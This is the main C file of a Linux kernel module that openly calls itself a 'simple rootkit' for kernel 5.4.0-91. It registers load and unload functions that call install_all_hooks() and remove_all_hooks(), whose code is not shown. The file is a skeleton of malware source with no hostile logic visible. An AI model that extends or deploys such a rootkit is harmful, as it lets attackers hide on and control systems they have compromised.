#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include "install_hooks.h"

#define MODNAME "rootkit"
#define MODAUTHOR "Leonardo.Chahud"
#define MODLICENSE "GPL"
#define MODVERSION "1.0"
#define MODDESC "Simple rootkit for Linux 5.4.0-91-generic"
#define print_fmt(text, ...) pr_info("%s : " text, MODNAME, ##__VA_ARGS__)



static int __init Main(void){
	print_fmt("Loaded.\n");
	install_all_hooks();
	return 0;
}


static void __exit Exit(void){
	print_fmt("Unloaded.\n");
	remove_all_hooks();
}

module_init(Main);
module_exit(Exit);

MODULE_LICENSE(MODLICENSE);
MODULE_VERSION(MODVERSION);
MODULE_DESCRIPTION(MODDESC);
MODULE_AUTHOR(MODAUTHOR);
